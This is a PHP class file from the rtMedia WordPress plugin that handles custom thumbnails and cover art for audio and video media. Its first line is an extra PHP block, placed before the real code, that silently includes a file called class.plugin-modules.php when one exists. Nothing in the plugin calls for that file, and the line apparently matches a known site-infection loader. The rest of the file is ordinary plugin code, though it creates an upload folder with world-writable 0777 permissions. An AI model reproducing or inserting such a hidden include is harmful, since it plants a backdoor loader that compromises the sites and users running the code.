<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * Author: Ritesh <ritesh.patel@rtcamp.com>
 */
class RTMediaMediaCustomThumbnail {

	/**
	 * Constructor
	 */
	public function __construct() {
		$this->load_translation();
		// Add custom thumbnail tab.
		add_action( 'rtmedia_add_edit_tab_content', array( $this, 'rtmedia_media_custom_thumbnail_content' ), 30, 1 );
		add_action( 'rtmedia_album_edit_fields', array( $this, 'rtmedia_album_custom_thumbnail_content' ), 30, 1 );
		add_action( 'rtmedia_add_edit_tab_title', array( $this, 'rtmedia_media_custom_thumbnail_title' ), 30, 1 );

		// Add action after update media.
		add_action( 'rtmedia_after_update_media', array( $this, 'rtmedia_media_save_custom_thumbnail' ), 30, 1 );
		// Enqueue js files.
		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_script_styles' ), 999 );
		add_filter( 'show_custom_album_cover', array( $this, 'rtmedia_set_custom_thumbnail_id' ), 10, 3 );

		add_filter( 'rtmedia_add_settings_sub_tabs', array( $this, 'rtmedia_custom_tumbnail_default_add_sub_tab' ), 100, 2 );
		// Initiate function to set default values.
		add_filter( 'rtmedia_general_content_default_values', array( $this, 'rtmedia_custom_tumbnail_add_default_value' ), 10, 1 );

		add_action( 'init', array( $this, 'rtmedia_custom_tumbnail_admin' ), 100, 1 );
		add_filter( 'rtmedia_allowed_types', array( $this, 'rtmedia_custom_thumbnail_allowed_types' ), 1, 1 );

		add_action( 'wp_ajax_rtmedia_delete_default_thumbnail', array( $this, 'rtmedia_delete_default_thumbnail' ) );
		// Change the cover art for audio/video as thumbnail.
		add_filter( 'rtmedia_media_thumb', array( $this, 'rtmedia_custom_tumbnail_cover_art' ), 10, 3 );
		// Set cover art in lightbox for media.
		add_filter( 'rtmedia_single_content_filter', array( $this, 'rtmedia_custom_thumbnail_on_lightbox' ), 10, 2 );
	}

	/**
	 * Below function add the custom cover art for audio/video on lightbox.
	 *
	 * @since 1.3.0
	 *
	 * @param string $html          This contain string that has element for media.
	 * @param object $rtmedia_media THis contain the media object.
	 *
	 * @return string
	 */
	public function rtmedia_custom_thumbnail_on_lightbox( $html, $rtmedia_media ) {
		global $rtmedia;
		$options = $rtmedia->options;
		if ( 'music' === $rtmedia_media->media_type ) {
			$default_size = $rtmedia->options['defaultSizes_music_singlePlayer_width'];
			if ( ! empty( $default_size ) ) {
				$width  = ( $default_size * 75 / $default_size );
				$height = ( $default_size * 0.50 );
				if ( '-1' !== $rtmedia_media->cover_art && ! empty( $rtmedia_media->cover_art ) ) {
					$html = sprintf( "<img src='%s' style='max-width:%s; max-height:%s' />", esc_url( $rtmedia_media->cover_art ), esc_attr( $width . '%' ), esc_attr( $height . 'px' ) ) . $html;
				} elseif ( ! empty( $options['rtm_default_thumbnail_audio'] ) ) {
					$audio_thumb_id             = $options['rtm_default_thumbnail_audio'];
					$custom_thumbnail_cover_art = get_post_meta( $audio_thumb_id, 'admin_site_custom_thumbnail_cover_art' );
					if ( ! empty( $custom_thumbnail_cover_art ) ) {
						$html = sprintf( "<img src='%s' style='max-width:%s; max-height:%s' />", esc_url( $custom_thumbnail_cover_art[0] ), esc_attr( $width . '%' ), esc_attr( $height . 'px' ) ) . $html;
					}
				}
			}
		} elseif ( 'video' === $rtmedia_media->media_type ) {
			if ( '-1' !== $rtmedia_media->cover_art && ! empty( $rtmedia_media->cover_art ) ) {
				return $html;
			}
			$audio_thumb_id             = $options['rtm_default_thumbnail_video'];
			$custom_thumbnail_cover_art = get_post_meta( $audio_thumb_id, 'admin_site_custom_thumbnail_cover_art' );

			if ( ! empty( $custom_thumbnail_cover_art ) ) {
				$youtube_url = get_rtmedia_meta( $rtmedia_media->id, 'video_url_uploaded_from' );
				$width       = $rtmedia->options['defaultSizes_video_singlePlayer_width'];
				$height      = $rtmedia->options['defaultSizes_video_singlePlayer_height'];
				$html        = sprintf( "<div id='rtm-mejs-video-container' style='width:%s;height:%s;' >", esc_attr( $width . 'px' ), esc_attr( $height . 'px' ) );
				if ( empty( $youtube_url ) ) {
					$html_video = '<video poster="%s" src="%s" width="%s" height="%s" type="video/mp4" class="wp-video-shortcode" id="rt_media_video_%s" controls="controls" preload="metadata"></video>';
					$html      .= sprintf( $html_video, esc_url( $custom_thumbnail_cover_art[0] ), esc_url( wp_get_attachment_url( $rtmedia_media->media_id ) ), esc_attr( $width ), esc_attr( $height ), esc_attr( $rtmedia_media->id ) );
					$html      .= sprintf( '</div>' );
				}
			}
		}

		return $html;
	}

	/**
	 * Set thumbnail in allowed types
	 *
	 * @since 1.3.0
	 *
	 * @global Object $rtmedia
	 * @param Array $allowed_types
	 * @return Array
	 */
	function rtmedia_custom_thumbnail_allowed_types( $allowed_types ) {

		global $rtmedia;
		$options = $rtmedia->options;

		/* Default thumbs */
		$audio_thumb = RTMEDIA_URL . 'app/assets/admin/img/audio_thumb.png';
		$video_thumb = RTMEDIA_URL . 'app/assets/admin/img/video_thumb.png';

		/* Get attachment from thumbnail saved by admin */
		if ( ! empty( $options['rtm_default_thumbnail_video'] ) ) {
			$video_thumb_id    = $options['rtm_default_thumbnail_video'];
			$video_thumb_array = wp_get_attachment_image_src( $video_thumb_id );
			if ( ! empty( $video_thumb_array ) ) {
				$video_thumb = $video_thumb_array['0'];
			}
		}

		/* Get attachment from thumbnail saved by admin */
		if ( ! empty( $options['rtm_default_thumbnail_audio'] ) ) {
			$audio_thumb_id    = $options['rtm_default_thumbnail_audio'];
			$audio_thumb_array = wp_get_attachment_image_src( $audio_thumb_id );
			if ( ! empty( $audio_thumb_array ) ) {
				$audio_thumb = $audio_thumb_array['0'];
			}
		}

		/* Set default thumbnail saved by admin */
		$allowed_types['video']['thumbnail'] = $video_thumb;
		$allowed_types['music']['thumbnail'] = $audio_thumb;

		return $allowed_types;
	}

	/**
	 * Called upload custom thumbnail function on rtMedia settings filter
	 *
	 * @since 1.3.0
	 */
	function rtmedia_custom_tumbnail_admin() {
		add_filter( 'rtmedia_pro_options_save_settings', array( $this, 'rtmedia_custom_tumbnail_default_upload_file' ), 100, 1 );
	}

	/**
	 * Uploaded and saved custom thumbnail images
	 *
	 * @since 1.3.0
	 *
	 * @global Object $rtmedia
	 * @param Array $options
	 * @return Array
	 */
	function rtmedia_custom_tumbnail_default_upload_file( $options ) {

		global $rtmedia;
		/* get wp's uploads directory paths and urls. */
		$wpuploaddir = wp_upload_dir();

		/* Folder for uploading temporary debug attachment. i.e SITE_ROOT/wp-content/uploads/rtMedia/tmp */
		$uploaddir = $wpuploaddir['basedir'] . '/rtMedia/default-thumbnails/';
		$uploadurl = $wpuploaddir['baseurl'] . '/rtMedia/default-thumbnails/';

		/* If folder is not there, then create it. */
		if ( ! is_dir( $uploaddir ) ) {
			if ( ! mkdir( $uploaddir, 0777, true ) ) {
				die( 'Failed to create folders...' );
			}
		}

		$allowed_type = $rtmedia->allowed_types['photo']['extn'];

		$defaults = array();

		$default_array = $this->rtmedia_custom_tumbnail_add_default_value( $defaults );

		if ( ! empty( $default_array ) ) {
			require_once ABSPATH . 'wp-admin/includes/file.php';
			foreach ( $default_array as $key => $val ) {
				$rtm_default_thumbnail = $attachment = $attachment_id = $ext = '';
				$error_array           = array();
				if ( ! empty( $_FILES[ $key ]['name'] ) ) {
					$file = $_FILES[ $key ];

					// unique filename to overwrite existing file.
					$filename = $file['name'];

					if ( $file['size'] <= 2000000 ) {
						$ext = pathinfo( basename( $filename ), PATHINFO_EXTENSION );

						// Move uploaded file.
						if ( in_array( strtolower( $ext ), $allowed_type, true ) ) {
							$upload_overrides = array( 'test_form' => false );
							$thumb_file       = wp_handle_upload( $file, $upload_overrides );
							$thumb_file_size  = image_make_intermediate_size( $thumb_file['file'], intval( $options['defaultSizes_photo_thumbnail_width'] ), intval( $options['defaultSizes_photo_thumbnail_height'] ), true );
							if ( $thumb_file_size ) {
								$file_name = explode( '/', $thumb_file['url'] );
								unset( $file_name[ count( $file_name ) - 1 ] );
								$file_name[] = $thumb_file_size['file'];
								$file_name   = implode( '/', $file_name );
								$file_type   = $thumb_file['type'];
								$file_path   = explode( '/', $thumb_file['file'] );
								unset( $file_path[ count( $file_path ) - 1 ] );
								$file_path[] = $thumb_file_size['file'];
								$file_path   = implode( '/', $file_path );

								// Create attachment for uploaded file.
								$attachment = array(
									'guid'           => $file_name,
									'post_mime_type' => $file_type,
									'post_title'     => basename( $file['name'] ),
									'post_content'   => '',
									'post_status'    => 'inherit',
								);

								$attachment_id = wp_insert_attachment( $attachment, $file_path );
								// Make sure that this file is included, as wp_generate_attachment_metadata() depends on it.
								// Generate the metadata for the attachment, and update the database record.
								$attach_data = wp_generate_attachment_metadata( $attachment_id, $file_name );
								wp_update_attachment_metadata( $attachment_id, $attach_data );
								if ( ! empty( $attachment_id ) ) {
									update_post_meta( $attachment_id, 'admin_site_custom_thumbnail_cover_art', $thumb_file['url'] );
									if ( 'rtm_default_thumbnail_audio' === $key ) {
										$options['rtm_default_thumbnail_audio'] = $attachment_id;
									} elseif ( 'rtm_default_thumbnail_video' === $key ) {
										$options['rtm_default_thumbnail_video'] = $attachment_id;
									}

									// Remove old custom thumbnail.
									if ( ! empty( $options[ $key . '_hid' ] ) ) {
										$this->rtmedia_delete_custom_tumbnail_from_upload_dir( $options[ $key . '_hid' ] );
									}
								}
							}
						} else {
							$error_array[] = sprintf( __( 'There was an error uploading your file %s.', 'rtmedia' ), $file['name'] );
						}
					} else {
						$error_array[] = sprintf( __( 'file %s is more that 2MB size.', 'rtmedia' ), $file['name'] );
					}
				}
				// If file is not uploaded then set old file Id.
				if ( ! empty( $options[ $key . '_hid' ] ) && empty( $attachment_id ) ) {
					$options[ $key ] = $options[ $key . '_hid' ];
				}
			}
		}
		return $options;
	}

	/**
	 * Loads language translation.
	 */
	public function load_translation() {
		load_plugin_textdomain( 'rtmedia', false, basename( RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_PATH ) . '/languages/' );
	}

	/**
	 * Loads scripts and styles.
	 */
	function enqueue_script_styles() {
		wp_enqueue_style( 'rtmedia-custom-thumbnails', RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_URL . 'app/assets/css/main.min.css', '', RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_VERSION );
		wp_enqueue_script( 'rtm-custom-thumb', RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_URL . 'app/assets/js/main.js', array( 'jquery' ), RTMEDIA_MEDIA_CUSTOM_THUMBNAIL_VERSION, true );
		// Localize the string in script.
		$rtm_custom_thumb_localization_strings = array(
			'incorrect_file_error_message' => esc_js( __( 'Please select correct file format', 'rtmedia' ) ),
		);
		wp_localize_script( 'rtm-custom-thumb', 'rtm_custom_thumb_localization_object', $rtm_custom_thumb_localization_strings );
	}

	/**
	 * Save custom thumbnail for media.
	 *
	 * @param type $id media id.
	 */
	function rtmedia_media_save_custom_thumbnail( $id ) {
		global $rtmedia;
		$options             = $rtmedia->options;
		$photo_allowed_types = $rtmedia->allowed_types['photo']['extn'];
		$media_type          = rtmedia_type( $id );
		$media_ext           = rtmedia_media_ext( $id );

		// Check for file exist in post object or not.
		$allow_custom_thumb_media = array( 'photo' );

		$is_checked = filter_input( INPUT_POST, 'rtmedia_media_custom_thumbnail_remove', FILTER_SANITIZE_STRING );
		if ( ! empty( $is_checked ) && 'on' === $is_checked ) {
			$this->rtm_remove_custom_thumbnail( $id );
		}

		$filters = array(
			'name'     => FILTER_SANITIZE_STRING,
			'type'     => FILTER_SANITIZE_STRING,
			'tmp_name' => FILTER_SANITIZE_STRING,
			'size'     => FILTER_VALIDATE_INT,
		);

		$thumbnail_file_input = filter_var_array( $_FILES['rtmedia_media_custom_thumbnail'], $filters );

		if ( ! empty( $thumbnail_file_input ) && ! empty( $thumbnail_file_input['name'] ) && strlen( $thumbnail_file_input['name'] ) > 0 && ! in_array( $media_type, $allow_custom_thumb_media, true ) ) {

			$image_extn = pathinfo( $thumbnail_file_input['name'], PATHINFO_EXTENSION );

			// Check for allowed types and max file size.
			if ( in_array( $image_extn, $photo_allowed_types, true ) && empty( $options['allowedTypes_photo_upload_limit'] ) || ( ! empty( $options['allowedTypes_photo_upload_limit'] ) && ( $options['allowedTypes_photo_upload_limit'] <= 0 || ( ( $_FILES['rtmedia_media_custom_thumbnail']['size'] / ( 1024 * 1024 ) ) <= $options['allowedTypes_photo_upload_limit'] ) ) ) ) {
				include_once ABSPATH . 'wp-admin/includes/media.php';
				include_once ABSPATH . 'wp-admin/includes/file.php';
				include_once ABSPATH . 'wp-admin/includes/image.php';
				$uploadedfile     = $thumbnail_file_input;
				$upload_overrides = array( 'test_form' => false );
				$thumb_file       = wp_handle_upload( $uploadedfile, $upload_overrides );
				$file_name        = $thumb_file['url'];
				$thumb_file_size  = image_make_intermediate_size( $thumb_file['file'], intval( $options['defaultSizes_photo_thumbnail_width'] ), intval( $options['defaultSizes_photo_thumbnail_height'] ), true );
				if ( $thumb_file_size ) {
					$file_name = explode( '/', $file_name );
					unset( $file_name[ sizeof( $file_name ) - 1 ] );
					$file_name[] = $thumb_file_size['file'];
					$file_name   = implode( '/', $file_name );
				}

				// Get old cover art.
				$old_cover_art = rtmedia_cover_art( $id );
				// Before uploadng new thumbnail remove old thumbnail for this  media.
				$this->rtm_remove_custom_thumbnail( $id );

				$rtmedia_model = new RTMediaModel();
				$rtmedia_model->update( array( 'cover_art' => $thumb_file['url'] ), array( 'id' => $id ) );
				update_rtmedia_meta( $id, 'thumbnail_cover_art', $file_name );
				$this->update_video_thumb_activity( $id, $old_cover_art );

				do_action( 'rtm_after_set_custom_thumbnail', $id, $file_name );
				if ( ( 'music' === $media_type ) && ( 'mp3' === $media_ext ) ) {
					if ( class_exists( 'RTMediaTags' ) ) {
						$filepath  = get_attached_file( rtmedia_media_id( $id ) );
						$media_tag = new RTMediaTags( $filepath );
						$media_tag->set_art( file_get_contents( $thumb_file['file'] ), $image_extn, $thumbnail_file_input['name'] );
						$media_tag->save();

						/*
						 * Sets the thumbnail as featured image also as wp do for audio...
						 */
						$media_id  = rtmedia_media_id( $id );
						$filepath  = get_attached_file( $media_id );
						$meta_data = wp_generate_attachment_metadata( $media_id, $filepath );
						wp_update_attachment_metadata( $media_id, $meta_data );
					}
				}
			} else {

				add_filter( 'rtmedia_single_edit_state', array( $this, 'rtmedia_single_edit_state_custom_thumbnail' ), 10, 1 );
				add_filter( 'rtmedia_update_media_message', array( $this, 'rtmedia_update_media_message_custom_thumbnail' ), 10, 1 );
			}
		}
	}

	/**
	 * set message when custom thubmnail file is not allowed
	 *
	 * @param type $message
	 * @return string returns error msg for invalid file
	 */
	function rtmedia_update_media_message_custom_thumbnail( $message ) {
		global $rtmedia;
		$options             = $rtmedia->options;
		$photo_allowed_types = $rtmedia->allowed_types['photo']['extn'];
		$image_extn          = pathinfo( $_FILES['rtmedia_media_custom_thumbnail']['name'], PATHINFO_EXTENSION );
		if ( ! in_array( $image_extn, $photo_allowed_types ) ) {
			$message = __( 'This file type is not allowed', 'rtmedia' );
		} else {
			$message = __( 'Max file size is: ', 'rtmedia' ) . $options['allowedTypes_photo_upload_limit'] . ' MB';
		}

		return $message;
	}

	/**
	 * filter media update state in case of file is not allowed or of big size for custom thumbnail
	 *
	 * @param type $state
	 * @return boolean return false
	 */
	function rtmedia_single_edit_state_custom_thumbnail( $state ) {
		return false;
	}

	/**
	 * Set title for custom media thumbnail tab
	 *
	 * @param type $media_type
	 */
	function rtmedia_media_custom_thumbnail_title( $media_type ) {
		$allow_custom_thumb_media = array( 'photo', 'album' );

		if ( ! in_array( $media_type, $allow_custom_thumb_media ) && apply_filters( 'rtm_allow_custom_thumbnail', true, $media_type ) ) {
			?>
			<li>
				<a href="#custom_thumb"><i class="dashicons dashicons-format-image"></i><?php _e( 'Media thumbnail', 'rtmedia' ); ?></a>
			</li>
			<?php
		}
	}

	/**
	 * Custom thumbnail input in media single edit page.
	 */
	function rtmedia_set_thumbnail_content_render() {
		?>
		<div class="content rtm-field-wrap" id="custom_thumb">
			<div class="rtmedia-custom-thumbnail-wrapper">
				<p><label class="rtmedia-custom-thumbnail-label"><?php _e( 'Current Thumbnail', 'rtmedia' ); ?>:</label>
				</p>

				<div>
					<img class="rtmedia-custom-thumbnail-image" src='<?php rtmedia_image(); ?>'/>
				</div>
				<div>
					<input type="file" name="rtmedia_media_custom_thumbnail" id="rtmedia_media_custom_thumbnail" class="rtmedia_media_custom_thumbnail"/>
				</div>
				<?php
				if ( $this->rtmedia_is_default_thumbnail() ) {
					?>
					<div>
						<label class="rtmedia-custom-thumbnail-label" for="rtmedia_media_custom_thumbnail_remove" >
							<input type="checkbox" name="rtmedia_media_custom_thumbnail_remove" id="rtmedia_media_custom_thumbnail_remove" class="rtmedia_media_custom_thumbnail" />
							<?php esc_html_e( 'Remove current thumbnail', 'rtmedia' ); ?>
						</label>
					</div>
					<?php
				}
				?>
			</div>
		</div>
		<?php
	}

	/**
	 * Check custom thumbnail is set or not
	 *
	 * @since 1.3.0
	 *
	 * @global type $rtmedia_backbone
	 * @global type $rtmedia_media
	 *
	 * @param int $id Media id.
	 *
	 * @return boolean
	 */
	function rtmedia_is_default_thumbnail( $id = false ) {
		global $rtmedia_backbone;

		if ( $rtmedia_backbone['backbone'] ) {
			echo '<%= guid %>';
			return;
		}

		if ( ! empty( $id ) ) {
			$model = new RTMediaModel();
			$media = $model->get_media( array( 'id' => $id ), false, false );

			if ( isset( $media[0] ) ) {
				$media_object = $media[0];
			} else {
				return false;
			}
		} else {
			global $rtmedia_media;
			$media_object = $rtmedia_media;
		}

		$thumbnail_id = 0;

		if ( ! empty( $media_object->media_type ) ) {
			if ( 'album' === $media_object->media_type || 'photo' !== $media_object->media_type || 'audio' === $media_object->media_type || 'video' === $media_object->media_type ) {
				$thumbnail_id = ( isset( $media_object->cover_art ) && ( ( false !== filter_var( $media_object->cover_art, FILTER_VALIDATE_URL ) )   // Cover art might be an absolute URL
				|| ( 0 < intval( $media_object->cover_art ) ) // Cover art might be a media ID
				) ) ? $media_object->cover_art : false;
				$thumbnail_id = apply_filters( 'show_custom_album_cover', $thumbnail_id, $media_object->media_type, $media_object->id ); // for rtMedia pro users
			} else {
				$thumbnail_id = false;
			}
		}
		return $thumbnail_id;
	}

	/**
	 * Show Custom thumbnail for only audio and video
	 *
	 * @param string $media_type
	 */
	function rtmedia_media_custom_thumbnail_content( $media_type ) {
		$allow_custom_thumb_media = array( 'photo', 'album' );

		if ( ! in_array( $media_type, $allow_custom_thumb_media ) && apply_filters( 'rtm_allow_custom_thumbnail', true, $media_type ) ) {
			$this->rtmedia_set_thumbnail_content_render();
		}
	}

	/**
	 * Show Custom thumbnail on edit media
	 *
	 * @param string $media_type
	 */
	function rtmedia_album_custom_thumbnail_content( $media_type ) {

		if ( 'album-edit' === $media_type && apply_filters( 'rtm_allow_custom_thumbnail', true, $media_type ) ) {
			$this->rtmedia_set_thumbnail_content_render();
		}
	}

	/**
	 * Remove custom thumb set before
	 *
	 * @param int $id Media id.
	 */
	function rtm_remove_custom_thumbnail( $id ) {

		$rtmedia_model       = new RTMediaModel();
		$media_type          = rtmedia_type( $id );
		$media_ext           = rtmedia_media_ext( $id );
		$media_cover_art_url = rtmedia_cover_art( $id );

		// This below code remove the thumbnail/cover_art from upload dir when we remove the particular audio/video thumbnail.
		if ( ! empty( $media_cover_art_url ) && '-1' !== $media_cover_art_url ) {
			$rtmedia_model->update( array( 'cover_art' => null ), array( 'id' => $id ) );
			$base_dir   = wp_upload_dir()['basedir'];
			$local_path = $base_dir . explode( '/uploads', $media_cover_art_url )[1];
			wp_delete_file( $local_path );
		}

		$thumbnail_cover_art_url = get_rtmedia_meta( $id, 'thumbnail_cover_art' );
		if ( ! empty( $thumbnail_cover_art_url ) ) {
			delete_rtmedia_meta( $id, 'thumbnail_cover_art' );
			$base_dir   = wp_upload_dir()['basedir'];
			$local_path = $base_dir . explode( '/uploads', $thumbnail_cover_art_url )[1];
			wp_delete_file( $local_path );
		}

		if ( ( 'music' === $media_type ) && ( 'mp3' === $media_ext ) ) {
			if ( class_exists( 'RTMediaTags' ) ) {

				$filepath  = get_attached_file( rtmedia_media_id( $id ) );
				$media_tag = new RTMediaTags( $filepath );

				$media_tag->set_art( '' );
				$media_tag->save();
			}
		} elseif ( 'video' === $media_type ) {

			// get old cover art.
			$old_cover_art = rtmedia_cover_art( $id );
			$this->update_video_thumb_activity( $id, $old_cover_art );
		}

		do_action( 'rtm_after_remove_custom_thumbnail', $id );
	}

	/**
	 * Function to fetch custom thumbnail
	 *
	 * @param int    $thumbnail_id
	 * @param string $media_type
	 * @param int    $id
	 * @return string src
	 */
	function rtmedia_set_custom_thumbnail_id( $thumbnail_id, $media_type, $id ) {
		global $rtmedia_media;
		$rtmedia_model = new RTMediaModel();

		if ( ( 'album' === $media_type || 'video' === $media_type ) && ! empty( $rtmedia_media->cover_art ) ) {
			$media = $rtmedia_model->get_media( array( 'media_id' => $rtmedia_media->cover_art ) );
			if ( isset( $media ) && isset( $media[0]->privacy ) ) {
				$thumbnail_id = $rtmedia_media->cover_art;
			}
		}
		return $thumbnail_id;
	}

	/**
	 * Update thumb activity for Video
	 *
	 * @global Object $wpdb
	 * @global Object $bp
	 * @param type $id
	 * @param type $old_cover_url
	 */
	function update_video_thumb_activity( $id, $old_cover_url ) {
		$activity_id = rtmedia_activity_id( $id );
		$post_id     = rtmedia_media_id( $id );

		// new cover.
		$new_cover_url = rtmedia_cover_art( $id );
		if ( is_numeric( $new_cover_url ) ) {
			$new_cover_url = wp_get_attachment_url( $new_cover_url );
		}

		// old cover.
		if ( is_numeric( $old_cover_url ) ) {
			$old_cover_url = wp_get_attachment_url( $old_cover_url );
		}

		// replace / with \/ to check in regex.
		$video_url = str_replace( '/', '\/', wp_get_attachment_url( $post_id ) );

		if ( ! empty( $activity_id ) ) {
			global $wpdb, $bp;

			// get old activity content
			$content = $wpdb->get_var( $wpdb->prepare( "SELECT content FROM {$bp->activity->table_name} WHERE id = %d", $activity_id ) );
			// regex match to get the video updated
			$regex_pattern = '/<video [^>]*\bsrc\s*=\s*"([^"]*' . $video_url . '*)[^>]*\b"([^"]*<\/video>*)/';
			$matches       = null;
			$match         = preg_match_all( $regex_pattern, $content, $matches );

			// replace poster if video is found in activity
			if ( $match ) {
				$video_content = $matches[0][0];
				if ( false === strpos( $video_content, 'poster' ) ) {
					$video_content = str_replace( '<video ', '<video poster="' . $new_cover_url . '" ', $video_content );
				} else {
					$video_content = str_replace( 'poster="' . $old_cover_url . '"', 'poster="' . $new_cover_url . '"', $video_content );
				}

				$content = str_replace( $matches[0][0], $video_content, $content );
				$wpdb->update( $bp->activity->table_name, array( 'content' => bp_activity_filter_kses( $content ) ), array( 'id' => $activity_id ) );
			}
		}
	}

	/**
	 * Added sub section for custom thumbnails
	 *
	 * @since 1.3.0
	 *
	 * @param type $sub_tabs
	 * @param type $tab
	 * @return string
	 */
	function rtmedia_custom_tumbnail_default_add_sub_tab( $sub_tabs, $tab ) {

		$sub_tabs[] = array(
			'href'     => '#rtmedia-custom-thumbnail-settings',
			'icon'     => 'dashicons-format-image',
			'title'    => esc_html__( 'Custom Thumbnail', 'rtmedia' ),
			'name'     => esc_html__( 'Custom Thumbnail', 'rtmedia' ),
			'callback' => array( 'RTMediaMediaCustomThumbnail', 'custom_thumbnail_content' ),
		);

		return $sub_tabs;
	}

	/**
	 * Function to define default values for rtm_watermark
	 *
	 * @since 1.3.0
	 *
	 * @param Array $defaults
	 * @return Array
	 */
	public function rtmedia_custom_tumbnail_add_default_value( $defaults ) {
		$defaults['rtm_default_thumbnail_audio'] = '';
		$defaults['rtm_default_thumbnail_video'] = '';

		return $defaults;
	}

	/**
	 * Function to display settings of Default thumbnail in sub-menu
	 *
	 * @since 1.3.0
	 * @global Object $rtmedia
	 */

	static function custom_thumbnail_content() {
		global $rtmedia;

		$options   = $rtmedia->options;
		$group     = array();
		$group[10] = __( 'Custom Thumbnail', 'rtmedia' );

		$render_options                                = array();
		$render_options['rtm_default_thumbnail_audio'] = array(
			'title'    => __( 'Audio Default Thumbnail', 'rtmedia' ),
			'callback' => array( 'RTMediaFormHandler', 'inputfile' ),
			'args'     => array(
				'key'   => 'rtm_default_thumbnail_audio',
				'value' => $options['rtm_default_thumbnail_audio'],
				'desc'  => __( 'This image will appear for thumbnail of audio files.', 'rtmedia' ),
			),
			'class'    => array( 'rtmedia-setting-select-box' ),
			'group'    => '10',
		);
		$render_options['rtm_default_thumbnail_video'] = array(
			'title'    => __( 'Video Default Thumbnail', 'rtmedia' ),
			'callback' => array( 'RTMediaFormHandler', 'inputfile' ),
			'args'     => array(
				'key'   => 'rtm_default_thumbnail_video',
				'value' => $options['rtm_default_thumbnail_video'],
				'desc'  => __( 'This image will appear for thumbnail of video files.', 'rtmedia' ),
			),
			'class'    => array( 'rtmedia-setting-select-box' ),
			'group'    => '10',
		);

		RTMediaFormHandler::render_tab_content( $render_options, $group, 10 );
	}

	/**
	 * Delete thumbnail set from dashboard
	 *
	 * @since 1.3.0
	 */
	function rtmedia_delete_default_thumbnail() {

		$media_type     = filter_input( INPUT_POST, 'media_type', FILTER_SANITIZE_STRING );
		$media_type     = ! empty( $media_type ) ? $media_type : '';
		$saved_options  = rtmedia_get_site_option( 'rtmedia-options' );
		$video_thumb_id = $saved_options['rtm_default_thumbnail_video'];
		$audio_thumb_id = $saved_options['rtm_default_thumbnail_audio'];

		if ( ! empty( $media_type ) && strcmp( 'rtm_default_thumbnail_audio', $media_type ) === 0 ) {
			$saved_options['rtm_default_thumbnail_audio']     = '';
			$saved_options['rtm_default_thumbnail_audio_hid'] = '';
			$this->rtmedia_delete_custom_tumbnail_from_upload_dir( $audio_thumb_id );

		}
		if ( ! empty( $media_type ) && strcmp( 'rtm_default_thumbnail_video', $media_type ) === 0 ) {
			$saved_options['rtm_default_thumbnail_video']     = '';
			$saved_options['rtm_default_thumbnail_video_hid'] = '';
			$this->rtmedia_delete_custom_tumbnail_from_upload_dir( $video_thumb_id );
		}

		rtmedia_update_site_option( 'rtmedia-options', $saved_options );

		wp_send_json_success();

		die();
	}

	/**
	 * Set the thumbnail size for  audio/video tab.
	 *
	 * @since 1.3.0
	 *
	 * @param string $src        This is cover art source string.
	 * @param int    $media_id   This is media id.
	 * @param string $media_type This contain media type.
	 * @return string $src       This is thumbnail source.
	 */
	public function rtmedia_custom_tumbnail_cover_art( $src, $media_id, $media_type ) {
		if ( 'video' === $media_type || 'music' === $media_type ) {
			$thumbnail_file_url = get_rtmedia_meta( $media_id, 'thumbnail_cover_art' );
			if ( ! empty( $thumbnail_file_url ) ) {
				return $thumbnail_file_url;
			}
		}
		return $src;
	}

	/**
	 * Remove custom  audio/video thumbnail from upload dir when remove/replace from backend.
	 *
	 * @since 1.3.0
	 *
	 * @param int $thumbnail_attach_id   This is custom thumbnail attachment id.
	 */
	public function rtmedia_delete_custom_tumbnail_from_upload_dir( $thumbnail_attach_id ) {

		if ( empty( $thumbnail_attach_id ) ) {
			return;
		}

		$custom_thumbnail_cover_art_url = get_post_meta( $thumbnail_attach_id, 'admin_site_custom_thumbnail_cover_art' );
		$thumb_attach_data              = wp_get_attachment_image_src( $thumbnail_attach_id );
		if ( ! empty( $thumb_attach_data ) ) {
			$custom_thumb_url = $thumb_attach_data[0];
			$base_dir         = wp_upload_dir()['basedir'];
			$local_path       = $base_dir . explode( '/uploads', $custom_thumb_url )[1];
			wp_delete_file( $local_path );
			wp_delete_attachment( $thumbnail_attach_id );
		}
		if ( ! empty( $custom_thumbnail_cover_art_url ) ) {
			$base_dir   = wp_upload_dir()['basedir'];
			$local_path = $base_dir . explode( '/uploads', $custom_thumbnail_cover_art_url[0] )[1];
			wp_delete_file( $local_path );
			delete_post_meta( $thumbnail_attach_id, 'admin_site_custom_thumbnail_cover_art' );
		}
	}
}


